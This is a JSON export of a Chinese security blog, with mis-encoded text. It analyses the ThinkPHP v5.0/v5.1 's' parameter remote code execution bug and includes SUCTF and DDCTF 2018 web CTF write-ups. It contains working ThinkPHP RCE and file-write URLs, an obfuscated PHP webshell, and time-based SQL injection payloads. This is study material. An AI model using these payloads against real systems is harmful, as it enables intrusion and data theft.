{"pages":[{"title":"","permalink":"http://blog.0kami.cn/404.html","text":"404"},{"title":"About","permalink":"http://blog.0kami.cn/about/index.html","text":"A web ğŸ¶ &amp;&amp; Code reviewer opens source toolsMonitorClient: A web server local monitor &amp; webshell scan and kill toolMonitorServer: A web server remote monitor &amp; webshell scan and kill tool"},{"title":"Search","permalink":"http://blog.0kami.cn/search/index.html","text":""}],"posts":[{"title":"ã€Code Analysisã€‘thinkphp v5.x App.php så‚æ•°RCE","permalink":"http://blog.0kami.cn/2019/02/05/thinkphp-v5-x-App-php-rce/","text":"æ¦‚è¿°æ”¾å‡äº†ï¼Œå¯¹thinkphpçš„å‡ ä¸ªRCEåšä¸€ä¸‹åˆ†æï¼Œè®°å½•ä¸€ä¸‹XD thinkphp v5.0.xæ¼æ´ç›¸å…³ä¿¡æ¯æ¼æ´ç‰ˆæœ¬ï¼š&lt;= 5.0.22è¡¥ä¸ï¼šç‰ˆæœ¬æ›´æ–° Â· top-think/framework@4cbc0b5 Â· GitHubé—®é¢˜ç‚¹ï¼šlibrary/think/App.php æ¼æ´åˆ†æå…³äºthinkphpçš„urlè§£ææ–¹å¼THINKPHPæ”¯æŒä½¿ç”¨PATHINFOçš„æ–¹å¼æ¥è®¿é—®å…·ä½“çš„æ¨¡å—ã€ç±»ã€æ–¹æ³•ï¼Œå¦‚index.php/module/controller/actionå¯¹äºä¸æ”¯æŒPATHINFOçš„æœåŠ¡å™¨ï¼ŒTHINKPHPæä¾›äº†å…¼å®¹æ¨¡å¼?s=/module/controller/actionçš„æ–¹å¼æ¥è®¿é—®è€Œè¿™æ¬¡çš„æ¼æ´æˆå› å°±æ˜¯åœ¨äºå…¼å®¹æ¨¡å¼å¤„ç†æ—¶å­˜åœ¨çš„é—®é¢˜ã€‚é¦–å…ˆçœ‹ thinkphp/library/think/Request.phpçš„pathinfoå‡½æ•°123456789101112131415161718public function pathinfo()&#123; if (is_null($this-&gt;pathinfo)) &#123; if (isset($_GET[Config::get('var_pathinfo')])) &#123; // åˆ¤æ–­URLé‡Œé¢æ˜¯å¦æœ‰å…¼å®¹æ¨¡å¼å‚æ•° $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); &#125; elseif (IS_CLI) &#123; // CLIæ¨¡å¼ä¸‹ index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; &#125; // åˆ†æPATHINFOä¿¡æ¯ ... $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); &#125; return $this-&gt;pathinfo;&#125; å½“GETè¯·æ±‚ä¸­å¸¦æœ‰så‚æ•°(configä¸­é»˜è®¤var_pathinfoä¸ºs)ï¼Œå°†pathinfoè®¾ç½®ä¸ºsçš„å‚æ•°å€¼æœ‰äº†pathinfoå€¼ï¼Œæˆ‘ä»¬å†æ‰¾åˆ°å…·ä½“çš„è§£æurlçš„å‡½æ•°ï¼Œthinkphp/library/think/Route.phpçš„parseUrlå‡½æ•°123456789101112public static function parseUrl($url, $depr = '/', $autoSearch = false)&#123; if (isset(self::$bind['module'])) &#123; $bind = str_replace('/', $depr, self::$bind['module']); // å¦‚æœæœ‰æ¨¡å—/æ§åˆ¶å™¨ç»‘å®š $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr); &#125; $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); $route = [null, null, null]; // ...&#125; å…¶ä¸­parseUrlå‡½æ•°çš„$urlä¸ºä¸Šé¢æ‹¿åˆ°çš„pathinfoï¼Œ$deprä¸ºé»˜è®¤çš„åˆ†å‰²ç¬¦é¦–å…ˆå¯¹$urlæ›¿æ¢åˆ†å‰²ç¬¦ä¸º|ï¼Œå†è¾“å…¥åˆ°parseUrlPathå‡½æ•°(æ ¹æ®/åˆ†å‰²)ï¼Œè¯¥å‡½æ•°å¯¹pathinfoè¿›è¡Œåˆ†å‰²ï¼Œäº§ç”Ÿmoduleã€controllerã€actioné‚£ä¹ˆç°åœ¨æ¥çœ‹rceçš„Poc?s=/index/\\think\\app/invokefunction=&gt;[module:index,controller:\\think\\app,action:invokefunction]å…¶ä¸­controller=&gt;\\think\\appï¼Œæ˜¯phpå‘½åç©ºé—´çš„è¡¨ç¤ºæ–¹å¼ï¼Œ\\think\\appå®é™…è°ƒç”¨library/think/App.phpï¼Œåé¢çš„actionå®é™…è°ƒç”¨çš„App.phpä¸­çš„invokefunctionå‡½æ•° æ¼æ´æˆå› ç‚¹ä¸Šé¢åˆ†æäº†thinkphpçš„å…¼å®¹æ¨¡å¼æ˜¯å¦‚ä½•å¤„ç†så‚æ•°çš„ï¼Œå¹¶ä¸”å¤„ç†å­˜åœ¨ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¯ä»¥ä¼ªé€ controllerï¼Œå¯¼è‡´å®é™…è°ƒç”¨ä¸ºå…¶ä»–çš„ç±»å’Œå‡½æ•°çœ‹ä¸€ä¸‹æ‹¿åˆ°moduleã€controllerã€actionåç³»ç»Ÿçš„å¤„ç†thinkphp/library/think/App.php çš„ moduleå‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static function module($result, $config, $convert = null)&#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); ... // è®¾ç½®é»˜è®¤è¿‡æ»¤æœºåˆ¶ $request-&gt;filter($config['default_filter']); ... try &#123; $instance = Loader::controller(// å®ä¾‹åŒ–controllerç±» $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // è·å–å½“å‰æ“ä½œå $action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // æ‰§è¡Œæ“ä½œæ–¹æ³• $call = [$instance, $action]; // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // ç©ºæ“ä½œ $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // æ“ä½œä¸å­˜åœ¨ throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars);// è°ƒç”¨å‡½æ•°&#125; æ‹¿åˆ°å®ä¾‹åŒ–åçš„å¯¹è±¡å’Œæ–¹æ³•ï¼ŒåŠ¨æ€è°ƒç”¨invokeMethod12345678910111213141516public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // é™æ€æ–¹æ³• $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars);// è·å–å‚æ•°å†…å®¹ è¿™é‡Œè·å–åˆ°å‚æ•°ç”¨åšmethodçš„å‚æ•°è¾“å…¥ self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125; è¿™é‡Œä½¿ç”¨bindParamså‡½æ•°ä»getæˆ–postä¸­è·å–åˆ°å¯¹åº”çš„å†…å®¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåšå‚æ•°åµŒå…¥æ—¶ï¼Œéœ€è¦ä»¥å‡½æ•°çš„å‚æ•°åä¸ºé”®å¦‚invokeFunctionçš„å‚æ•°ä¸º$functionã€$varsï¼Œé‚£ä¹ˆåœ¨å‚æ•°ä¸­å°±éœ€è¦ä»¥function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxxå³pocçš„ååŠéƒ¨åˆ†function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-læ‰€ä»¥è°ƒç”¨é“¾ç°åœ¨å˜æˆäº† åŠ¨æ€è°ƒç”¨\\think\\app invokeFunctionå‡½æ•° æä¾›function=call_user_func_arrayä½œä¸ºinvokeFunctionåŠ¨æ€è°ƒç”¨çš„å‚æ•°ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥è°ƒç”¨call_user_func_arrayå‡½æ•° call_user_func_arrayçš„å‚æ•°ä¸ºsystemå‡½æ•°ï¼Œsystemå‡½æ•°çš„å‚æ•°ä¸ºls -lï¼Œæ‰€ä»¥è¿™é‡Œç”¨äº†2ç»´æ•°ç»„ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‘æ•£ä¸€ä¸‹æ€ç»´ï¼Œæˆ‘ä»¬å…¶å®ä¸å•å•å¯ä»¥è°ƒç”¨\\think\\appè¿™ä¸ªç±»ï¼Œå¦‚æœå…¶ä»–çš„ç±»å¯ä»¥ä»»æ„è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œæˆ–è€…æ˜¯è°ƒç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ŒåŒæ ·å…·æœ‰å±å®³æ€§å¦‚ä»»æ„å‘½ä»¤æ‰§è¡Œ?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œç”Ÿæˆåœ¨index.phpåŒä¸€çº§ç›®å½•?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();è·å–é…ç½®ä¿¡æ¯?s=index/\\think\\config/get&amp;name=database.username thinkphp v5.1.xç‰ˆæœ¬ä¿¡æ¯ç‰ˆæœ¬ï¼š&lt;= v5.1.30è¡¥ä¸ä¿¡æ¯ï¼šä¿®æ­£æ§åˆ¶å™¨è°ƒç”¨ Â· top-think/framework@802f284 Â· GitHubæ¼æ´ç‚¹ï¼šthinkphp/library/think/route/dispatch/Module.php æ¼æ´åˆ†æåŸç†åŒv5.0.xç‰ˆæœ¬ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±äºså‚æ•°å¸¦å…¥çš„è·¯å¾„è§£æå­˜åœ¨å®‰å…¨é—®é¢˜å¯¼è‡´çš„ä»»æ„ä»£ç æ‰§è¡Œå…ˆçœ‹App::run()1234567891011121314151617181920212223242526272829303132333435public function run()&#123; try &#123; // åˆå§‹åŒ–åº”ç”¨ $this-&gt;initialize(); ... $dispatch = $this-&gt;dispatch; if (empty($dispatch)) &#123; // è·¯ç”±æ£€æµ‹ $dispatch = $this-&gt;routeCheck()-&gt;init();// å¤„ç†moduleã€controllerã€action &#125; // è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯ $this-&gt;request-&gt;dispatch($dispatch); ... &#125; catch (HttpResponseException $exception) &#123; $dispatch = null; $data = $exception-&gt;getResponse(); &#125; $this-&gt;middleware-&gt;add(function (Request $request, $next) use ($dispatch, $data) &#123; return is_null($data) ? $dispatch-&gt;run() : $data; &#125;); $response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);// åŠ¨æ€è°ƒç”¨controllerã€action ... return $response;&#125; App::run()å‡½æ•°ä½“ç°äº†ç¨‹åºçš„ä¸€ä¸ªä¸»è¦æµç¨‹ï¼Œä»è·¯å¾„çš„è§£æåˆ°åŠ¨æ€è§£ææ‰§è¡Œç›¸åº”çš„æ§åˆ¶å™¨åŠæ–¹æ³•å…ˆæ¥çœ‹çœ‹ç¬¬13è¡Œï¼Œè·å–ç›¸åº”çš„è·¯å¾„ä¿¡æ¯thinkphp/library/think/App.php routeCheck()å‡½æ•°1234567891011121314151617181920public function routeCheck()&#123; // æ£€æµ‹è·¯ç”±ç¼“å­˜ ... // è·å–åº”ç”¨è°ƒåº¦ä¿¡æ¯ $path = $this-&gt;request-&gt;path(); // ä»Request.php pathæå–urlpath å…·ä½“ä»pathinfo()ï¼Œä¼˜å…ˆè·å–$_GET[$this-&gt;config['var_pathinfo']] // var_pathinfo é»˜è®¤ä¸ºs // æ˜¯å¦å¼ºåˆ¶è·¯ç”±æ¨¡å¼ $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;route-&gt;config('url_route_must'); // è·¯ç”±æ£€æµ‹ è¿”å›ä¸€ä¸ªDispatchå¯¹è±¡ $dispatch = $this-&gt;route-&gt;check($path, $must);//è¿”å›UrlDispatchç±»å®ä¾‹ï¼Œä»dispatchç±»å¤„ç»§æ‰¿ ... return $dispatch;&#125; ç¬¬7è¡Œä»så‚æ•°ä¸­è·å–è·¯ç”±è·¯å¾„(sä¸ºvar_pathinfoçš„é»˜è®¤å€¼)ï¼Œåœ¨è°ƒç”¨routeCheckå‡½æ•°åè¿”å›ä¸€ä¸ªUrlDispatchï¼Œä¹‹åè°ƒç”¨äº†Urlç±»çš„initå‡½æ•°thinkphp/library/think/route/dispatch/Url.php init12345678public function init()&#123; // è§£æé»˜è®¤çš„URLè§„åˆ™ $result = $this-&gt;parseUrl($this-&gt;dispatch); // parseUrlå‡½æ•°å¤„ç†å‚æ•°å€¼(ä»¥/åˆ†å‰²ï¼Œä¼ å…¥|ä¹Ÿè¡Œä¼šè¢«æ›¿æ¢æˆ/ï¼Œæœ€ç»ˆç”±/æ¥åˆ†å‰²)ï¼Œè¿”å›[module,controller,action] return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();&#125; è¿”å›Moduleå¯¹è±¡ï¼Œç»§æ‰¿è‡ªDispatchå¯¹è±¡ï¼Œå¹¶ä¸”è°ƒç”¨äº†initå‡½æ•°ï¼Œå°†è§£æåçš„è·¯ç”±å¡«å……åˆ°dispatchï¼Œä¾›åé¢App::run()å‡½æ•°åŠ¨æ€è°ƒç”¨dispatchçš„runå‡½æ•°ï¼Œv5.1ç‰ˆæœ¬çš„è°ƒç”¨é“¾å¤æ‚äº†ä¸€ç‚¹ï¼Œä½†æ˜¯å…¶å®å†…å®¹åŒv5.0ç‰ˆæœ¬ç±»ä¼¼Dispatch::run()å‡½æ•°è°ƒç”¨äº†Module::exec()å‡½æ•°thinkphp/library/think/route/dispatch/Module.php exec()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public function exec()&#123; // ç›‘å¬module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // å®ä¾‹åŒ–æ§åˆ¶å™¨ $instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); if ($instance instanceof Controller) &#123; $instance-&gt;registerMiddleware(); &#125; &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // é—­åŒ…è°ƒç”¨ $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // è·å–å½“å‰æ“ä½œå $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // æ‰§è¡Œæ“ä½œæ–¹æ³• $call = [$instance, $action]; // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡ $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); $vars = array_merge($vars, $this-&gt;param); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // ç©ºæ“ä½œ $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // æ“ä½œä¸å­˜åœ¨ throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; ç®€å•æè¿°execå‡½æ•°ï¼Œå®ä¾‹åŒ–controllerï¼Œç”¨äºåé¢20è¡Œåˆ°55è¡Œçš„é—­åŒ…å‡½æ•°ï¼Œè¿™ä¸ªå¿…æŠ¥å‡½æ•°ä¸»è¦å®Œæˆäº†è°ƒç”¨controllerçš„actionï¼Œå¹¶è·å–è¾“å…¥çš„å‚æ•°å€¼ï¼Œæœ€åç”±invokeReflectMethodå®Œæˆä¸»è¦çš„è°ƒç”¨ã€‚æœ€ç»ˆçš„è°ƒç”¨å‡½æ•°ä¸ºRequest::filterValueå‡½æ•°123456789101112131415161718192021222324252627282930private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤ $value = call_user_func($filter, $value);//è°ƒç”¨å‡½æ•° &#125; elseif (is_scalar($value)) &#123; if (false !== strpos($filter, '/')) &#123; // æ­£åˆ™è¿‡æ»¤ if (!preg_match($filter, $value)) &#123; // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼ $value = $default; break; &#125; &#125; elseif (!empty($filter)) &#123; // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤ // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) &#123; $value = $default; break; &#125; &#125; &#125; &#125; return $value;&#125; åˆ°è¿™é‡Œå…¶å®æ€è·¯å¾ˆæ˜æ˜¾ï¼Œåˆ©ç”¨/åˆ†å‰²å‡ºèƒ½åˆ©ç”¨çš„controllerï¼Œå¹¶è¾“å…¥ç›¸åº”çš„å‚æ•°å€¼ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾å¯åˆ©ç”¨çš„å‡½æ•°ã€‚v5.0ç‰ˆæœ¬ä¸­pocéƒ½èƒ½ç”¨ å¦‚ä»»æ„å‘½ä»¤æ‰§è¡Œ?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œç”Ÿæˆåœ¨index.phpåŒä¸€çº§ç›®å½•?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();è·å–é…ç½®ä¿¡æ¯?s=index/\\think\\config/get&amp;name=database.usernameé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨\\think\\request/inputï¼ˆv5.0ç‰ˆæœ¬ä¸èƒ½ç”¨æ˜¯å› ä¸ºthink\\requestçš„æ„é€ å‡½æ•°ä¸ºprotectedï¼Œä¸å…è®¸åŠ¨æ€è°ƒç”¨ï¼‰å¦‚ä»»æ„ä»£ç æ‰§è¡Œ?s=index/\\think\\request/input&amp;data[]=123&amp;filter=phpinfoinvokeFunctionæ ¸å¿ƒReflectionFunction?s=index/\\think\\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1?s=index/\\think\\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1å› ä¸ºthink\\appç»§æ‰¿è‡ªthink\\containerï¼Œæ‰€ä»¥æ”¹æˆthink\\appä¹Ÿè¡Œå…¶ä¸­call_user_funcå¡«å……å‚æ•°æ—¶ï¼Œä»¥æ•°ç»„å½¢å¼ï¼Œç¬¬ä¸€ä¸ªä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªä¸ºå‡½æ•°å‚æ•°call_user_func_arrayå¡«å……å‚æ•°æ—¶ï¼Œä»¥æ•°ç»„å½¢å¼ï¼Œç¬¬ä¸€ä¸ªä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªä¸ºå‡½æ•°å‚æ•°ï¼ˆä¹Ÿä¸ºæ•°ç»„å½¢å¼ï¼‰è¿™é‡Œv5.1åªèƒ½ç”¨php7ï¼Œå¦‚v5.0è¿˜å¯ä»¥ä½¿ç”¨assertæ¥æ‰§è¡Œå‡½æ•° æ€»ç»“è¿™æ¬¡å‡ºçš„è¿™ä¸ªæ¼æ´å±å®³å¾ˆå¤§ï¼Œæ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ä¹Ÿéå¸¸æ¼‚äº®ï¼Œå€¼å¾—ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ã€‚å…¶ä¸­æ”¶è·å¤§è‡´å°±æ˜¯äº†è§£äº†thinkphp v5ç‰ˆæœ¬è·¯ç”±è°ƒç”¨çš„æµç¨‹ï¼Œv5.1ç‰ˆæœ¬çš„é—­åŒ…å‡½æ•°æ„é€ çš„æ–¹å¼ç»™æ¡†æ¶å¸¦æ¥äº†ä¸ä¸€æ ·çš„æ„Ÿå—ï¼Œä¸å¾—ä¸ç»™thinkphpä¸€ä¸ªèµ"},{"title":"ã€CTFã€‘SUCTF 2018 éƒ¨åˆ†web writeup","permalink":"http://blog.0kami.cn/2018/05/28/suctf-part-web-writeup/","text":"SUCTFæŠ½äº†ç‚¹æ—¶é—´åšäº†2é“SUCTFçš„webé¢˜ï¼Œè®°å½•ä¸€ä¸‹writeupã€‚ Anonymousè€ƒç‚¹phpçš„åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼Œä»¥åŠcreate_functionæ‰€è¿”å›çš„åŒ¿åå‡½æ•° wpè®¿é—®é¢˜ç›®ï¼Œç›´æ¥ç»™äº†æºç 12345678910$MY = create_function(&quot;&quot;,&quot;some code&quot;); // æ‰§è¡Œäº†catå‘½ä»¤ï¼Œè¯»å–flagå†…å®¹$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125; æ€è·¯æ¯”è¾ƒæ˜ç¡®ï¼Œå°±æ˜¯æƒ³åŠæ³•æ‰§è¡Œcreate_functionæ‰€äº§ç”Ÿçš„åŒ¿åå‡½æ•°ã€‚è€Œå…¶ä¸­SUCTF_32ï¼Œè¿™ä¸ªå‡½æ•°æ˜ç¡®æ˜¯æ²¡åŠæ³•çˆ†ç ´å‡ºæ¥çš„ã€‚é‚£ä¹ˆå°±åªèƒ½åœ¨ $MY ä¸Šä¸‹åŠŸå¤«ã€‚æ‰“å°ä¸€ä¸‹$MYçš„å€¼ï¼Œå‘ç°create_functionè¿”å›äº†\\0lambda_{number},é‚£ä¹ˆå°±å¾ˆæ˜ç¡®äº†ï¼Œåªè¦æš´åŠ›ä¸€ä¸‹è¿™ä¸ªnumberå°±æœ‰ä¸€å®šå‡ ç‡æ‰§è¡Œè¯¥å‡½æ•°ï¼Œè¿™é‡Œæˆ‘æš´åŠ›äº†å¤§æ¦‚1000å¤šå°±æœ‰2æ¡æ‰§è¡Œäº† Getshellè€ƒç‚¹https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html wp é¦–å…ˆç¡®å®šå¯ç”¨å­—ç¬¦ï¼Œä½¿ç”¨bpå°†æ‰€æœ‰å¯è§å­—ç¬¦æš´åŠ›ä¸€éåå‘ç°å¯æ‰“å°å­—ç¬¦ä¸º$ () [] _ ~ . ; =ï¼Œä»¥åŠå…¶ä»–ä¸å¯æ‰“å°å­—ç¬¦ã€‚ æ ¹æ®pç‰›çš„åšå®¢ï¼Œå‘ç°å–åä¸­æ–‡å¯ä»¥èµ·åˆ°ä½œç”¨ï¼Œæµ‹è¯•~({ä¸­æ–‡})å‘ç°å¯æ ¹æ®ä¸­æ–‡çš„utf-8ç¼–ç çš„ä¸­é—´2ä¸ªhexç è¿›è¡Œå¯¹å­—æ¯çš„éå†http://www.herongyang.com/gb2312_gb/pinyin_32.html å‡‘å‡ºå­—ç¬¦assertï¼Œ_GETï¼Œå¹¶åŠ¨æ€æ‰§è¡Œã€‚ä¸ºäº†å‡‘å‡ºä¸Šé¢çš„å­—ç¬¦ï¼Œæˆ‘é‡‡ç”¨é€ä¸ªåå–åbin2hex(~(&#39;a&#39;))è·å¾—ä¸­æ–‡utf-8ç¼–ç çš„ä¸­é—´2ä¸ªï¼Œæœè¡¨å³å¯æ‰¾åˆ°å¯¹åº”çš„ä¸­æ–‡ï¼Œå†™ä¸€ä¸‹æˆ‘çš„getshellä»£ç  123456789101112131415161718192021222324&lt;?php$_=~(ç);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(éš™);$__.=$_[[]==[]];$_=~(å¸);$__.=$_[[]==[]];$_=~(å‹‹);$__.=$_[[]==[]];$_=~(æ ¡);$___.=$_[[]==[]];$_=~(ä¸‹);$___.=$_[[]==[]];$_=~(çº¤);$___.=$_[[]==[]];$_=~(å«Œ);$___.=$_[[]==[]];$___=$$___;$__($___[_]); ä¸Šä¼ äº†shellä¹‹åå°±æ¯”è¾ƒå®¹æ˜“äº†ï¼Œç¿»ç›®å½•å³å¯ 12system(&apos;ls /&apos;)system(&apos;cat /Th1s_14_f14g&apos;) æ€»ç»“è®°å½•ä¸€ä¸‹getshellçš„å‘ç‚¹ evalä¸æ˜¯å‡½æ•°ï¼Œæ˜¯è¯­å¥ ä¸ç”¨å¼•å·ï¼Œç”¨ä¸­æ–‡ä¹Ÿè¢«phpå½“ä½œæ˜¯å­—ç¬¦ä¸² UTF-8ç¼–ç  http://www.herongyang.com/gb2312_gb/pinyin_32.html"},{"title":"ã€CTFã€‘DDCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/","text":"DDCTF 2018 2é“WEB Writeup WEB00 æ•°æ®åº“çš„ç§˜å¯†step 1:index.php éœ€è¦ä»¥IP:116.85.43.88è®¿é—®ï¼Œhttpå¤´åŠ å…¥ X-Forwarded-For: 116.85.43.88 ç»•è¿‡ step 2:ç»•è¿‡åæ˜¯ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢åŠŸèƒ½ï¼Œç®€å•æµ‹è¯•åå‘ç°id,title,dateæœ‰å®‰å…¨å¤„ç†ï¼Œä½†æ˜¯è¡¨å•ä¸­è¿˜éšè—ç€authorï¼Œå¹¶ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†ã€‚ä»¥payloada%&#39; &amp;&amp; &#39;%&#39;=&#39;%ã€a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%ç¡®å®šæ³¨å…¥å­˜åœ¨,æƒ³ç€ç”¨unionç›´æ¥æå–å‡ºæ¥ï¼Œå‘ç°åå°è¿˜æœ‰WAFï¼Œæ²¡ç»•è¿‡å»ï¼Œä½†æ˜¯å¯¹äºç›²æ³¨ï¼ŒæˆåŠŸæ„é€ å‡ºäº†payloada%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%,å‘ç”Ÿ5ç§’å»¶è¿Ÿã€‚ï¼ˆåæ¥æƒ³æƒ³å…¶å®å¯ä»¥ç”¨boolå‹ç›²æ³¨æå–æ•°æ®ï¼‰ step 3:ç¡®è®¤äº†authorå­—æ®µå¯ä»¥æ³¨å…¥ï¼Œä½†æ˜¯è¿™é“é¢˜è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯sha1æ ¡éªŒï¼Œè¦æƒ³å†™è„šæœ¬ï¼Œå¿…é¡»å…ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç ”ç©¶äº†ä¸€ä¸‹main.jsï¼Œå‘ç°ä»¥ç±»ä¼¼id=title=date=author=time=çš„å­—ç¬¦ä¸²sha1å¤„ç†ååå°æ ¡éªŒ step 4:å†™è„šæœ¬ï¼Œä¸»è¦åŒ…æ‹¬sha1æ ¡éªŒå’Œæ—¶é—´ç›²æ³¨ï¼Œè´´ä¸€ä¸‹payload 123456789101112payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# è·å–åˆ°åº“å ddctfpayload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# è·å–åˆ°è¡¨å message, ctf_key4payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit 